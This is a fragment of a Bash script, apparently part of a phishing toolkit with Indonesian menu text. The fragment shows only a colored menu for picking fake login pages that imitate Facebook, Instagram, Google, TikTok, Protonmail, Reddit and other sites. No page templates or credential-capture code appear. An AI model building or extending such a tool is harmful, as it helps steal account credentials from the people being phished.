...
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		      ${RED}[${WHITE}∆${RED}]${KU} Pilih Metode Website/Situs ${RED}[${WHITE}∆${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${KU} Facebook Login 
		${RED}[${WHITE}02${RED}]${KU} FB Advanced Voting
		${RED}[${WHITE}03${RED}]${KU} Facebook Security
		${RED}[${WHITE}04${RED}]${KU} Facebook Mess Login
		${RED}[${WHITE}05${RED}]${KU} Instagram Web Login
		${RED}[${WHITE}06${RED}]${KU} Instagram Followers
		${RED}[${WHITE}07${RED}]${KU} Instagram 1000 Follow
		${RED}[${WHITE}08${RED}]${KU} Instagram Verifikasi
		${RED}[${WHITE}09${RED}]${KU} Geogle
        ${RED}[${WHITE}10${RED}]${KU} Tiktok     
           
        ${RED}[${WHITE}11${RED}]${KU} Twitch
		${RED}[${WHITE}12${RED}]${KU} Pinterest
		${RED}[${WHITE}13${RED}]${KU} Snapchat
		${RED}[${WHITE}14${RED}]${KU} LinkEdin
		${RED}[${WHITE}15${RED}]${KU} Ebay
		${RED}[${WHITE}16${RED}]${KU} Quora
		${RED}[${WHITE}17${RED}]${KU} Protonmail
		${RED}[${WHITE}18${RED}]${KU} Sportify
		${RED}[${WHITE}19${RED}]${KU} Reddit
        ${RED}[${WHITE}20${RED}]${KU} Adobe
        
		${RED}[${WHITE}Y${RED}]${KU} Youtube Me     ${RED}[${WHITE}W${RED}]${KU} WhatsApp Me
